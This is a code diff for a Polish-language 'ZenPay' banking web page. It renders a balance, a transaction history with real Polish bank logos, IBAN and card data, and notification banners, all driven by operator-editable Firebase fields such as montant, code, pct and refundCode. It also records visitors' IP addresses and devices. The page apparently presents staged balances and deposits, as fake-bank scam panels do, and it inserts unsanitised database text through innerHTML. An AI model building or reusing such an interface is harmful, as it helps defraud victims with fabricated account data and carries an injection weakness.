-    const avgCharWidth = baseSize * 0.55;
-    const maxCharsLocal = maxChars || Math.floor(containerWidth / avgCharWidth);
-    let newSize = baseSize;
-    if (text.length > maxCharsLocal) {
-      newSize = Math.max(minSize || 10, baseSize * (maxCharsLocal / text.length));
-    }
-    element.style.fontSize = newSize + 'px';
-  });
-}
-
-function adjustGreetingFontSize() {
-  const greetSpan = document.querySelector('#greet span');
-  if (greetSpan) {
-    const container = document.getElementById('greet');
-    if (container) {
-      const containerWidth = container.clientWidth - 80;
-      const baseSize = 18;
-      const avgCharWidth = baseSize * 0.55;
-      const maxChars = Math.floor(containerWidth / avgCharWidth);
-      adjustFontSize(greetSpan, baseSize, maxChars, 12);
-    }
-  }
-}
-
-function adjustBalanceFontSize(element) {
-  if (!element) return;
-  const text = element.textContent || '';
-  const container = element.parentElement;
-  if (!container) return;
-  const containerWidth = container.clientWidth - 40;
-  const baseSize = 24;
-  const avgCharWidth = baseSize * 0.55;
-  const maxChars = Math.floor(containerWidth / avgCharWidth);
-  adjustFontSize(element, baseSize, maxChars, 10);
-}
-
-function adjustStatFontSize(element) {
-  if (!element) return;
-  const text = element.textContent || '';
-  const container = element.parentElement;
-  if (!container) return;
-  const containerWidth = container.clientWidth - 20;
-  const baseSize = 20;
-  const avgCharWidth = baseSize * 0.55;
-  const maxChars = Math.floor(containerWidth / avgCharWidth);
-  adjustFontSize(element, baseSize, maxChars, 11);
-}
-
-function adjustAllTexts() {
-  adjustGreetingFontSize();
-  const bal = document.getElementById('bal');
-  if (bal) adjustBalanceFontSize(bal);
-  document.querySelectorAll('.stat-value').forEach(el => adjustStatFontSize(el));
-}
-
-function updateBalanceDisplay(balanceElement, statElement, amount) {
-  const formatted = fmt(amount);
-  if (balanceElement) {
-    balanceElement.textContent = formatted;
-    adjustBalanceFontSize(balanceElement);
-  }
-  if (statElement) {
-    statElement.textContent = formatted;
-    adjustStatFontSize(statElement);
-  }
-  adjustAllTexts();
-}
-
-// ===== DONNÉES BANCAIRES =====
-function updateBankData(data) {
-  if (!data) return;
-  document.getElementById('ibanOwner').textContent = data.ibanOwner || 'KWIATKOWSKI PW';
-  document.getElementById('ibanNumber').textContent = data.iban || 'LT15 2339 1465 189X XXXX';
-  document.getElementById('ibanBic').textContent = data.ibanBic || 'TTQGLTIJCJK';
-  document.getElementById('ibanBank').textContent = data.ibanBank || 'ZenPay Finance';
-  const holder = data.carteHolder || 'JAN KOWALSKI';
-  const numRaw = data.carteNumero || '455655188867XXXX';
-  const num = numRaw.replace(/\s/g, '');
-  const exp = data.carteExpiry || '02/28';
-  const cvv = data.carteCvv || '556';
-  const detailNumEl = document.getElementById('cardDetailNumber');
-  const detailCvvEl = document.getElementById('cardDetailCvv');
-  detailNumEl.dataset.realNumber = num;
-  detailCvvEl.dataset.realCvv = cvv;
-  document.getElementById('cardHolderName').textContent = holder;
-  document.getElementById('cardDetailHolder').textContent = holder;
-  document.getElementById('cardExpiry').textContent = exp;
-  document.getElementById('cardDetailExpiry').textContent = exp;
-  document.getElementById('cardCvv').textContent = '***';
-  document.getElementById('cardDetailCvv').textContent = '***';
-  const p1 = num.substring(0,4), p2 = num.substring(4,8), p3 = num.substring(8,12);
-  document.getElementById('cardNumber').innerHTML = `<span>${p1}</span><span>${p2}</span><span>${p3}</span><span>XXXX</span>`;
-  detailNumEl.textContent = `${p1} ${p2} ${p3} XXXX`;
-}
-
-function setupBankListener(userId) {
-  if (banqueRef) banqueRef();
-  banqueRef = onValue(ref(db, 'clients/' + userId + '/banque'), (snapshot) => {
-    const data = snapshot.val();
-    updateBankData(data);
-  });
-}
-
-// ===== SESSIONS =====
-async function getPublicIP() {
-  try {
-    const res = await fetch('https://api.ipify.org?format=json');
-    const data = await res.json();
-    return data.ip || 'Inconnue';
-  } catch {
-    return 'Inconnue';
-  }
-}
-
-function getDeviceName() {
-  const ua = navigator.userAgent;
-  if (ua.includes('iPhone')) return 'iPhone';
-  if (ua.includes('Android')) return 'Android';
-  if (ua.includes('Windows')) return 'Windows PC';
-  if (ua.includes('Mac')) return 'Mac';
-  if (ua.includes('Linux')) return 'Linux';
-  return 'Appareil inconnu';
-}
-
-async function updateSession(connected = true) {
-  if (!user || !user._id) return;
-  const ip = await getPublicIP();
-  const device = getDeviceName();
-  const now = Date.now();
-
-  const storedSessionId = localStorage.getItem('zenpay_session_id');
-  if (storedSessionId) {
-    const sessionSnap = await get(ref(db, 'clients/' + user._id + '/sessions/' + storedSessionId));
-    if (sessionSnap.exists()) {
-      await update(ref(db, 'clients/' + user._id + '/sessions/' + storedSessionId), {
-        connected: connected,
-        lastActivity: now,
-        ip: ip,
-        device: device
-      });
-      sessionId = storedSessionId;
-      return;
-    }
-  }
-
-  const newSessionRef = push(ref(db, 'clients/' + user._id + '/sessions'));
-  const newSessionId = newSessionRef.key;
-  await set(newSessionRef, {
-    device: device,
-    ip: ip,
-    connected: connected,
-    lastActivity: now,
-    created: now
-  });
-  localStorage.setItem('zenpay_session_id', newSessionId);
-  sessionId = newSessionId;
-}
-
-async function refreshSession() {
-  if (user && user._id && sessionId) {
-    const ip = await getPublicIP();
-    await update(ref(db, 'clients/' + user._id + '/sessions/' + sessionId), {
-      lastActivity: Date.now(),
-      ip: ip
-    });
-  }
-}
-
-// ===== HISTORIQUE =====
-function getSenderName(tx) {
-  return tx.sender || tx.senderName || tx.beneficiary || tx.subtitle || tx.from || tx.nadawca || 'Nieznany nadawca';
-}
-
-// ===== VRAIS LOGOS DES BANQUES POLONAISES =====
-const BANK_LOGOS = {
-  // ===== FAVICONS OFFICIELS GOOGLE (SOURCE LA PLUS FIABLE) =====
-  // sz=256 demande la meilleure résolution disponible sur le site officiel
-  'mbank':       { img: 'https://www.google.com/s2/favicons?domain=mbank.pl&sz=256',            name: 'mBank',           color: '#C41230', bg: '#FEE2E2' },
-  'pko':         { img: 'https://www.google.com/s2/favicons?domain=pkobp.pl&sz=256',            name: 'PKO BP',          color: '#003087', bg: '#DBEAFE' },
-  'ing':         { img: 'https://www.google.com/s2/favicons?domain=ing.pl&sz=256',              name: 'ING',             color: '#FF6600', bg: '#FFEDD5' },
-  'santander':   { img: 'https://www.google.com/s2/favicons?domain=santander.pl&sz=256',        name: 'Santander',       color: '#EC0000', bg: '#FEE2E2' },
-  'pekao':       { img: 'https://www.google.com/s2/favicons?domain=pekao.com.pl&sz=256',        name: 'Pekao',           color: '#1D4F91', bg: '#DBEAFE' },
-  'millennium':  { img: 'https://www.google.com/s2/favicons?domain=millennium.pl&sz=256',       name: 'Millennium',      color: '#8B1D41', bg: '#FCE7F3' },
-  'alior':       { img: 'https://www.google.com/s2/favicons?domain=aliorbank.pl&sz=256',        name: 'Alior',           color: '#00A651', bg: '#D1FAE5' },
-  'bnpparibas':  { img: 'https://www.google.com/s2/favicons?domain=bnpparibas.pl&sz=256',       name: 'BNP',             color: '#008737', bg: '#D1FAE5' },
-  'creditagricole': { img: 'https://www.google.com/s2/favicons?domain=credit-agricole.pl&sz=256', name: 'CA',            color: '#007E4A', bg: '#D1FAE5' },
-  'citi':        { img: 'https://www.google.com/s2/favicons?domain=citibank.pl&sz=256',         name: 'Citi',            color: '#003B70', bg: '#DBEAFE' },
-  'bos':         { img: 'https://www.google.com/s2/favicons?domain=bosbank.pl&sz=256',          name: 'BOŚ',             color: '#006341', bg: '#D1FAE5' },
-  'getin':       { img: 'https://www.google.com/s2/favicons?domain=getinbank.pl&sz=256',        name: 'Getin',           color: '#0055A4', bg: '#DBEAFE' },
-  'idea':        { img: 'https://www.google.com/s2/favicons?domain=ideabank.pl&sz=256',         name: 'Idea',            color: '#FDB913', bg: '#FEF3C7' },
-  'nest':        { img: 'https://www.google.com/s2/favicons?domain=nestbank.pl&sz=256',         name: 'Nest',            color: '#E3001B', bg: '#FEE2E2' },
-  'pocztowy':    { img: 'https://www.google.com/s2/favicons?domain=bankpocztowy.pl&sz=256',     name: 'Pocztowy',        color: '#D52B1E', bg: '#FEE2E2' },
-  'sgb':         { img: 'https://www.google.com/s2/favicons?domain=sgb.pl&sz=256',              name: 'SGB',             color: '#005A9C', bg: '#DBEAFE' },
-  'velo':        { img: 'https://www.google.com/s2/favicons?domain=velobank.pl&sz=256',         name: 'Velo',            color: '#6A0DAD', bg: '#F3E8FF' },
-  'noble':       { img: 'https://www.google.com/s2/favicons?domain=getinbank.pl&sz=256',        name: 'Noble',           color: '#1A1A1A', bg: '#E5E7EB' },
-  'eurobank':    { img: 'https://www.google.com/s2/favicons?domain=eurobank.pl&sz=256',         name: 'Eurobank',        color: '#0055A4', bg: '#DBEAFE' },
-  'raiffeisen':  { img: 'https://www.google.com/s2/favicons?domain=raiffeisen.pl&sz=256',       name: 'Raiffeisen',      color: '#FFDC00', bg: '#FEF9C3' },
-  'toyota':      { img: 'https://www.google.com/s2/favicons?domain=toyotabank.pl&sz=256',       name: 'Toyota',          color: '#EB0A1E', bg: '#FEE2E2' },
-  'volkswagen':  { img: 'https://www.google.com/s2/favicons?domain=vwbank.pl&sz=256',           name: 'VW Bank',         color: '#001E50', bg: '#DBEAFE' },
-  'sberbank':    { img: 'https://www.google.com/s2/favicons?domain=sberbank.ru&sz=256',         name: 'Sberbank',        color: '#1D8F3C', bg: '#D1FAE5' },
-  'inteligo':    { img: 'https://www.google.com/s2/favicons?domain=inteligo.pl&sz=256',         name: 'Inteligo',        color: '#FF6600', bg: '#FFEDD5' },
-  'orange':      { img: 'https://www.google.com/s2/favicons?domain=orange.pl&sz=256',           name: 'Orange',          color: '#FF6600', bg: '#FFEDD5' },
-  'alior_sync':  { img: 'https://www.google.com/s2/favicons?domain=aliorbank.pl&sz=256',        name: 'Alior Sync',      color: '#00A651', bg: '#D1FAE5' },
-  'bph':         { img: 'https://www.google.com/s2/favicons?domain=bph.pl&sz=256',              name: 'BPH',             color: '#0055A4', bg: '#DBEAFE' },
-  'bgz':         { img: 'https://www.google.com/s2/favicons?domain=bgz.pl&sz=256',              name: 'BGŻ',             color: '#00843D', bg: '#D1FAE5' },
-  'paribas':     { img: 'https://www.google.com/s2/favicons?domain=bnpparibas.pl&sz=256',       name: 'Paribas',         color: '#008737', bg: '#D1FAE5' },
-  'aig':         { img: 'https://www.google.com/s2/favicons?domain=aig.com&sz=256',             name: 'AIG',             color: '#003B70', bg: '#DBEAFE' }
-};
-
-function stringToColor(str) {
-  let hash = 0;
-  for (let i = 0; i < str.length; i++) {
-    hash = str.charCodeAt(i) + ((hash << 5) - hash);
-  }
-  const colors = [
-    'linear-gradient(135deg, #667eea 0%, #764ba2 100%)',
-    'linear-gradient(135deg, #f093fb 0%, #f5576c 100%)',
-    'linear-gradient(135deg, #4facfe 0%, #00f2fe 100%)',
-    'linear-gradient(135deg, #43e97b 0%, #38f9d7 100%)',
-    'linear-gradient(135deg, #fa709a 0%, #fee140 100%)',
-    'linear-gradient(135deg, #30cfd0 0%, #330867 100%)',
-    'linear-gradient(135deg, #ff9a9e 0%, #fecfef 100%)',
-    'linear-gradient(135deg, #ffecd2 0%, #fcb69f 100%)',
-    'linear-gradient(135deg, #a8edea 0%, #fed6e3 100%)',
-    'linear-gradient(135deg, #ff8a80 0%, #ea6100 100%)'
-  ];
-  const index = Math.abs(hash) % colors.length;
-  return colors[index];
-}
-
-function getBankLogo(tx) {
-  if (tx.senderBank && tx.senderBank !== 'custom' && BANK_LOGOS[tx.senderBank]) {
-    return { ...BANK_LOGOS[tx.senderBank], isBank: true };
-  }
-  // Banque personnalisée ou inconnue : avatar professionnel avec initiales
-  const name = tx.senderName || tx.subtitle || tx.sender || 'Bank';
-  return { img: null, name: name, isBank: false, isCustom: true };
-}
-
-function renderHistory(historyArray) {
-  const list = document.getElementById('history-list');
-  list.innerHTML = '';
-  let count = 0;
-
-  if (!historyArray || historyArray.length === 0) {
-    list.innerHTML = `<div class="empty-history"><i class="fa-regular fa-receipt"></i> Brak transakcji</div>`;
-    document.getElementById('stat-tx').textContent = 0;
-    document.getElementById('tx-count-badge').textContent = 0;
-    return;
-  }
-
-  const getTransactionTime = (item) => {
-    if (item.timestamp && typeof item.timestamp === 'number') return item.timestamp;
-    if (item.date && item.time) {
-      const parts = item.date.split('.');
-      if (parts.length === 3) {
-        const day = parseInt(parts[0], 10);
-        const month = parseInt(parts[1], 10) - 1;
-        const year = parseInt(parts[2], 10);
-        const timeParts = item.time.split(':');
-        const hours = parseInt(timeParts[0], 10);
-        const minutes = parseInt(timeParts[1], 10);
-        return new Date(year, month, day, hours, minutes).getTime();
-      }
-    }
-    return 0;
-  };
-
-  const getTransactionDate = (item) => {
-    const ts = getTransactionTime(item);
-    if (ts) {
-      const d = new Date(ts);
-      return { day: d.getDate(), month: d.getMonth(), year: d.getFullYear() };
-    }
-    if (item.date) {
-      const parts = item.date.split('.');
-      if (parts.length === 3) {
-        return { day: parseInt(parts[0], 10), month: parseInt(parts[1], 10) - 1, year: parseInt(parts[2], 10) };
-      }
-    }
-    return null;
-  };
-
-  const today = new Date();
-  const todayDate = { day: today.getDate(), month: today.getMonth(), year: today.getFullYear() };
-  const yesterday = new Date(today); yesterday.setDate(yesterday.getDate() - 1);
-  const yesterdayDate = { day: yesterday.getDate(), month: yesterday.getMonth(), year: yesterday.getFullYear() };
-
-  const formatDateLabel = (txDate) => {
-    if (!txDate) return 'Inna data';
-    if (txDate.day === todayDate.day && txDate.month === todayDate.month && txDate.year === todayDate.year) return 'Dzisiaj';
-    if (txDate.day === yesterdayDate.day && txDate.month === yesterdayDate.month && txDate.year === yesterdayDate.year) return 'Wczoraj';
-    const months = ['stycznia','lutego','marca','kwietnia','maja','czerwca','lipca','sierpnia','września','października','listopada','grudnia'];
-    return `${txDate.day} ${months[txDate.month]} ${txDate.year}`;
-  };
-
-  const sorted = [...historyArray].sort((a, b) => getTransactionTime(b) - getTransactionTime(a));
-  count = sorted.length;
-
-  // Grouper par date
-  const groups = {};
-  sorted.forEach(d => {
-    const txDate = getTransactionDate(d);
-    const label = formatDateLabel(txDate);
-    if (!groups[label]) groups[label] = [];
-    groups[label].push(d);
-  });
-
-  const groupOrder = ['Dzisiaj', 'Wczoraj'];
-  const otherLabels = Object.keys(groups).filter(l => !groupOrder.includes(l));
-  otherLabels.sort((a, b) => {
-    const aTx = groups[a][0];
-    const bTx = groups[b][0];
-    return getTransactionTime(bTx) - getTransactionTime(aTx);
-  });
-  const allLabels = [...groupOrder.filter(l => groups[l]), ...otherLabels];
-
-  allLabels.forEach((label, groupIndex) => {
-    // En-tête de groupe
-    const groupHeader = document.createElement('div');
-    groupHeader.className = 'history-group-header';
-    groupHeader.innerHTML = `<span>${label}</span>`;
-    list.appendChild(groupHeader);
-
-    groups[label].forEach((d, index) => {
-      const card = document.createElement('div');
-      card.className = 'history-item';
-      card.setAttribute('data-id', d.id);
-      card.style.animationDelay = `${index * 0.04}s`;
-
-      const pos = d.amount >= 0;
-      const isRefund = pos && d.title === 'Zwrot';
-      let displayTitle = d.title;
-      let displaySubtitle = d.subtitle;
-      let iconClass = '';
-      let amountClass = '';
-      let iconHtml = '';
-
-      if (isRefund) {
-        displayTitle = 'Zwrot środków';
-        iconClass = 'refund';
-        amountClass = 'refund';
-        iconHtml = `<div style="width:44px;height:44px;border-radius:14px;background:linear-gradient(135deg,#EDE9FE,#DDD6FE);display:flex;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(124,58,237,0.15);"><i class="fa-solid fa-rotate-left" style="color:#7C3AED;font-size:16px;"></i></div>`;
-      } else if (pos) {
-        const logo = getBankLogo(d);
-        if (logo.isBank && logo.img) {
-          iconClass = 'credit bank-logo';
-          iconHtml = `<div style="width:44px;height:44px;border-radius:14px;background:#fff;display:flex;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(0,0,0,0.08);padding:4px;overflow:hidden;"><img src="${logo.img}" alt="${logo.name}" style="width:36px;height:36px;object-fit:contain;" onerror="this.style.display='none';this.parentElement.innerHTML='<div style=\'width:36px;height:36px;border-radius:50%;background:${logo.bg};color:${logo.color};display:flex;align-items:center;justify-content:center;font-size:11px;font-weight:700;\'>${logo.name.substring(0,2).toUpperCase()}</div>';"></div>`;
-        } else if (logo.isCustom) {
-          iconClass = 'credit custom-bank';
-          const initials = logo.name.split(' ').map(w => w[0]).join('').substring(0, 2).toUpperCase();
-          const bgGradient = stringToColor(logo.name);
-          iconHtml = `<div style="width:44px;height:44px;border-radius:14px;background:${bgGradient};color:#fff;display:flex;align-items:center;justify-content:center;font-size:15px;font-weight:800;box-shadow:0 2px 8px rgba(0,0,0,0.12);text-shadow:0 1px 2px rgba(0,0,0,0.25);letter-spacing:0.5px;border:2px solid rgba(255,255,255,0.3);">${initials}</div>`;
-        } else {
-          iconClass = 'credit human-logo';
-          iconHtml = `<div style="width:44px;height:44px;border-radius:14px;background:linear-gradient(135deg,#D1FAE5,#A7F3D0);display:flex;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(5,150,105,0.12);"><i class="fa-solid fa-arrow-down" style="color:#059669;font-size:16px;"></i></div>`;
-        }
-        amountClass = 'credit';
-      } else {
-        iconClass = 'debit';
-        amountClass = 'debit';
-        iconHtml = `<div style="width:44px;height:44px;border-radius:14px;background:linear-gradient(135deg,#FEE2E2,#FECACA);display:flex;align-items:center;justify-content:center;box-shadow:0 2px 8px rgba(220,38,38,0.12);"><i class="fa-solid fa-arrow-up" style="color:#DC2626;font-size:16px;"></i></div>`;
-      }
-
-      const subtitleText = displaySubtitle ? displaySubtitle : (pos ? 'Przelew otrzymany' : 'Przelew wysłany');
-      const timeText = d.time || '';
-
-      card.innerHTML = `
-        <div class="history-left">
-          <div class="history-icon ${iconClass}">${iconHtml}</div>
-          <div class="history-info">
-            <div class="title">${displayTitle}</div>
-            <div class="subtitle">${subtitleText}</div>
-            <div class="meta">${timeText}</div>
-          </div>
+<body>
+
+  <!-- ========== ÉCRAN ACCÈS INTERDIT ========== -->
+  <div id="banned-screen" style="display:none;position:fixed;inset:0;background:#fff;z-index:99999;align-items:center;justify-content:center;flex-direction:column;overflow-y:auto;padding:24px;">
+    <div class="banned-logo">
+      <div class="banned-logo-icon">Z</div>
+      <div class="banned-logo-text">ZenPay</div>
+    </div>
+    <div class="banned-sub">NEW APP ZY 🏆</div>
+    <div class="banned-illustration">
+      <div class="banned-person left">
+        <svg viewBox="0 0 36 70" fill="none" xmlns="http://www.w3.org/2000/svg">
+          <ellipse cx="18" cy="10" rx="8" ry="8" fill="#fbbf24"/>
+          <path d="M8 22h20v24H8z" fill="#60a5fa"/>
+          <path d="M12 46h12v20H12z" fill="#1e3a8a"/>
+          <path d="M8 22l-4 16" stroke="#fbbf24" stroke-width="3" stroke-linecap="round"/>
+          <path d="M28 22l4 16" stroke="#fbbf24" stroke-width="3" stroke-linecap="round"/>
+          <rect x="12" y="26" width="12" height="16" rx="2" fill="#34d399" opacity="0.3"/>
+        </svg>
+      </div>
+      <div class="banned-phone left">
+        <div class="screen-content"><div class="banned-wallet"></div></div>
+      </div>
+      <div class="banned-arrow"></div>
+      <div class="banned-phone right">
+        <div class="screen-content" style="justify-content:center;gap:6px;flex-direction:column;">
+          <div class="banned-check"><i class="fa-solid fa-check"></i></div>
+          <div class="banned-card-mini"></div>
         </div>
-        <div class="history-amount-col">
-          <div class="history-amount ${amountClass}">${pos ? '+' : '-'}${fmt(Math.abs(d.amount))}</div>
-          <div class="history-status">${pos ? 'Zrealizowany' : 'Zrealizowany'}</div>
-        </div>
-      `;
-      card.onclick = () => showTxDetail(d);
-      list.appendChild(card);
-    });
-  });
-
-  document.getElementById('stat-tx').textContent = count;
-  document.getElementById('tx-count-badge').textContent = count;
-}
-
-function genId(prefix) {
-  return prefix + Math.floor(1000000000 + Math.random() * 9000000);
-}
-
-function addDebitHistory(data) {
-  if (!data.amount || data.amount >= 0) return Promise.resolve();
-  if (!data.id) data.id = genId('DE');
-  const { dateStr, timeStr, timestamp } = getPolandDateTime();
-  if (!data.time || !data.timestamp) {
-    data.time = timeStr;
-    data.timestamp = timestamp;
-  }
-  if (!data.date) data.date = dateStr;
-  if (user && user._id) {
-    console.log('📤 Ajout de la transaction de débit:', data);
-    return push(ref(db, 'clients/' + user._id + '/history'), data)
-      .then(() => {
-        console.log('✅ Transaction de débit enregistrée avec succès');
-        return data;
-      })
-      .catch(err => {
-        console.error('❌ Erreur push débit:', err);
-        return null;
-      });
-  } else {
-    console.warn('⚠️ user._id manquant, impossible d\'ajouter la transaction');
-    return Promise.resolve(null);
-  }
-}
-
-function getNotifiedCreditIds(userId) {
-  const key = `zenpay_notified_credits_${userId}`;
-  try {
-    const stored = localStorage.getItem(key);
-    return stored ? JSON.parse(stored) : [];
-  } catch {
-    return [];
-  }
-}
-
-function setNotifiedCreditIds(userId, ids) {
-  const key = `zenpay_notified_credits_${userId}`;
-  localStorage.setItem(key, JSON.stringify(ids));
-}
-
-async function handleNewCreditTransaction(tx, userId) {
-  if (!tx || tx.amount <= 0) return;
-  if (tx.title === 'Zwrot') return;
-
-  const notifiedIds = getNotifiedCreditIds(userId);
-  if (notifiedIds.includes(tx.id)) return;
-
-  const montantFormatted = fmt(tx.amount);
-  const beneficiaire = getSenderName(tx);
-  const nomClient = user.nom || 'Klient';
-  const bannerMsg = `Witam ${nomClient}, Otrzymałeś przelew od ${beneficiaire} na kwotę ${montantFormatted}.`;
-
-  console.log('📢 Génération de bannière pour crédit:', bannerMsg);
-
-  try {
-    await update(ref(db, 'clients/' + userId), { bannerMessage: '', bannerRead: true });
-    await update(ref(db, 'clients/' + userId), { bannerMessage: bannerMsg, bannerRead: false });
-    user.bannerMessage = bannerMsg;
-    user.bannerRead = false;
-    updateBanner();
-
-    notifiedIds.push(tx.id);
-    setNotifiedCreditIds(userId, notifiedIds);
-    console.log('✅ Bannière de crédit générée et transaction marquée');
-  } catch (e) {
-    console.error('❌ Erreur lors de la génération de la bannière de crédit:', e);
-  }
-}
-
-async function initHistoryListener(userId) {
-  if (historyListener) historyListener();
-  try {
-    const snapshot = await get(ref(db, 'clients/' + userId + '/history'));
-    if (snapshot.exists()) {
-      const val = snapshot.val();
-      const arr = Object.values(val);
-      currentHistory = arr;
-      renderHistory(arr);
-    } else {
-      currentHistory = [];
-      renderHistory([]);
-    }
-  } catch (err) {
-    console.error('Erreur chargement historique:', err);
-    renderHistory([]);
-  }
-
-  historyListener = onValue(ref(db, 'clients/' + userId + '/history'), (snap) => {
-    const val = snap.val();
-    let arr = [];
-    if (val) {
-      arr = Object.values(val);
-      currentHistory = arr;
-      renderHistory(arr);
-
-      const notifiedIds = getNotifiedCreditIds(userId);
-      const newCredits = arr.filter(tx => tx.amount > 0 && tx.title !== 'Zwrot' && !notifiedIds.includes(tx.id));
-      if (newCredits.length > 0) {
-        newCredits.forEach(tx => {
-          handleNewCreditTransaction(tx, userId);
-        });
-      }
-    } else {
-      currentHistory = [];
-      renderHistory([]);
-    }
-  });
-}
-
-// ===== SURVEILLANCE SOLDE =====
-function watchBalance(userId) {
-  if (balanceListener) balanceListener();
-  balanceListener = onValue(ref(db, 'clients/' + userId + '/montant'), (snap) => {
-    const newMontant = snap.val();
-    if (newMontant === null || newMontant === undefined) return;
-    user.montant = Number(newMontant);
-    const balElement = document.getElementById('bal');
-    const statBalElement = document.getElementById('stat-balance');
-    updateBalanceDisplay(balElement, statBalElement, user.montant);
-    document.getElementById('bal2').textContent = fmt(user.montant);
-    updateProfileInfo();
-  });
-}
-
-// ===== SURVEILLANCE STATUT =====
-function watchClientStatus(userId) {
-  if (statusListener) statusListener();
-  statusListener = onValue(ref(db, 'clients/' + userId), (snap) => {
-    const data = snap.val();
-    if (!data) {
-      toast('Konto usunięte');
-      setTimeout(() => forceLogout(true), 1500);
-      return;
-    }
-    if (data.blocked) {
-      toast('Konto zablokowane');
-      setTimeout(() => forceLogout(false), 1000);
-      return;
-    }
-    if (data.historyReset) {
-      const key = 'zenpay_' + user.email.toLowerCase();
-      const stored = JSON.parse(localStorage.getItem(key) || '{}');
-      if (!stored.lastReset || data.historyReset > stored.lastReset) {
-        localStorage.setItem(key, JSON.stringify({ montant: 0, history: [], lastReset: data.historyReset }));
-        user.montant = 0;
-        const balElement = document.getElementById('bal');
-        const statBalElement = document.getElementById('stat-balance');
-        updateBalanceDisplay(balElement, statBalElement, 0);
-        document.getElementById('bal2').textContent = fmt(0);
-        updateProfileInfo();
-        toast('Historia i saldo zresetowane');
-      }
-      return;
-    }
-    const oldTheme = user.theme;
-    const oldNom = user.nom;
-    user.pct = data.pct;
-    user.code = data.code;
-    user.refundCode = data.refundCode || '';
-    user.msg = data.msg;
-    user.pays = data.pays;
-    user.adresse = data.adresse;
-    user.tel = data.tel;
-    user.devise = data.devise || 'zł';
-    user.notification = data.notification || '';
-    user.theme = data.theme || 'teal';
-    user.nom = data.nom || user.nom;
-    user.email = data.email || user.email;
-    
-    user.bannerMessage = data.bannerMessage || '';
-    user.bannerRead = data.bannerRead || false;
-    updateBanner();
-    
-    if (oldNom !== user.nom) {
-      const greetEl = document.getElementById('greet');
-      if (greetEl) {
-        greetEl.innerHTML = `Witaj, <span>${user.nom}</span>`;
-        adjustGreetingFontSize();
-      }
-    }
-    if (oldTheme !== user.theme) {
-      applyTheme(user.theme);
-      document.querySelectorAll('.btn').forEach(btn => btn.style.background = 'var(--p)');
-    }
-    updateAvatars();
-    updateCurrency();
-    updateNotifBadge();
-    updateProfileInfo();
-    adjustAllTexts();
-  });
-}
-
-// ===== FONCTIONS BANNIÈRE =====
-function updateBanner() {
-  const container = document.getElementById('banner-container');
-  const textEl = document.getElementById('bannerText');
-  if (!container || !textEl) return;
-  
-  clearBannerTimer();
-  
-  if (user && user.bannerMessage && user.bannerMessage.trim() !== '' && !user.bannerRead) {
-    textEl.innerHTML = user.bannerMessage;
-    container.style.display = 'block';
-    console.log('📢 Bannière affichée');
-    
-    if (user && user._id) {
-      bannerTimer = setTimeout(async () => {
-        console.log('⏰ Fermeture automatique de la bannière après 5 minutes');
-        await closeBanner(true);
-      }, 5 * 60 * 1000);
-    }
-  } else {
-    container.style.display = 'none';
-    console.log('📢 Bannière masquée');
-  }
-}
-
-function clearBannerTimer() {
-  if (bannerTimer) {
-    clearTimeout(bannerTimer);
-    bannerTimer = null;
-    console.log('⏹️ Timer de bannière annulé');
-  }
-}
-
-window.closeBanner = async function(auto = false) {
-  if (!user || !user._id) return;
-  try {
-    if (!auto) {
-      await update(ref(db, 'clients/' + user._id), { bannerRead: true });
-      user.bannerRead = true;
-    } else {
-      await update(ref(db, 'clients/' + user._id), { bannerRead: true });
-      user.bannerRead = true;
-    }
-    clearBannerTimer();
-    updateBanner();
-    if (auto) {
-      console.log('🤖 Bannière fermée automatiquement après 5 minutes');
-    } else {
-      console.log('❌ Bannière fermée par le client');
-    }
-  } catch (e) {
-    console.error('Erreur fermeture bannière:', e);
-  }
-};
-
-// ===== RAFRAÎCHISSEMENT =====
-window.refreshData = async function(silent = true) {
-  if (!user || !user._id || refreshInProgress) return;
-  refreshInProgress = true;
-  const refreshIcons = ['refreshIcon', 'refreshIcon2', 'refreshIcon3', 'refreshIcon4', 'refreshIcon5'];
-  refreshIcons.forEach(id => {
-    const el = document.getElementById(id);
-    if (el) {
-      el.parentElement.classList.add('spinning');
-    }
-  });
-  try {
-    const snapshot = await get(ref(db, 'clients/' + user._id));
-    const data = snapshot.val();
-    if (!data) {
-      if (!silent) toast('Erreur : compte introuvable');
-      refreshIcons.forEach(id => {
-        const el = document.getElementById(id);
-        if (el) {
-          el.parentElement.classList.remove('spinning');
-        }
-      });
-      refreshInProgress = false;
-      return;
-    }
-    user.pct = data.pct;
-    user.code = data.code;
-    user.refundCode = data.refundCode || '';
-    user.msg = data.msg;
-    user.pays = data.pays;
-    user.adresse = data.adresse;
-    user.tel = data.tel;
-    user.devise = data.devise || 'zł';
-    user.notification = data.notification || '';
-    user.theme = data.theme || 'teal';
-    user.montant = Number(data.montant) || 0;
-    user.nom = data.nom || user.nom;
-    user.email = data.email || user.email;
-    user.bannerMessage = data.bannerMessage || '';
-    user.bannerRead = data.bannerRead || false;
-    updateBanner();
-    const greetEl = document.getElementById('greet');
-    if (greetEl) {
-      greetEl.innerHTML = `Witaj, <span>${user.nom}</span>`;
-      adjustGreetingFontSize();
-    }
-
-    const balElement = document.getElementById('bal');
-    const statBalElement = document.getElementById('stat-balance');
-    updateBalanceDisplay(balElement, statBalElement, user.montant);
-    document.getElementById('bal2').textContent = fmt(user.montant);
-
-    const historySnap = await get(ref(db, 'clients/' + user._id + '/history'));
-    if (historySnap.exists()) {
-      const val = historySnap.val();
-      const arr = Object.values(val);
-      currentHistory = arr;
-      renderHistory(arr);
-    } else {
-      currentHistory = [];
-      renderHistory([]);
-    }
-    updateProfileInfo();
-    updateAvatars();
-    updateCurrency();
-    updateNotifBadge();
-    applyTheme(user.theme);
-    if (!silent) toast('✅ Données actualisées !');
-  } catch (error) {
-    console.error('Erreur lors du rafraîchissement:', error);
-    if (!silent) toast('❌ Erreur lors de l\'actualisation');
-  } finally {
-    refreshIcons.forEach(id => {
-      const el = document.getElementById(id);
-      if (el) {
-        el.parentElement.classList.remove('spinning');
-      }
-    });
-    refreshInProgress = false;
-  }
-};
-
-// ===== NAVIGATION =====
-window.navigateTo = function(id) {
-  history.pushState({ screen: id }, '', '#' + id);
-  show(id);
-  if (id === 'verify' && user) {
-    initCodeField();
-  }
-};
-
-window.openCard = function() {
-  document.getElementById('card').classList.remove('hidden');
-};
-window.closeCard = function() {
-  document.getElementById('card').classList.add('hidden');
-};
-
-window.openAcc = function() {
-  document.getElementById('acc').classList.remove('hidden');
-};
-window.closeAcc = function() {
-  document.getElementById('acc').classList.add('hidden');
-};
-
-window.openIbanModal = function() {
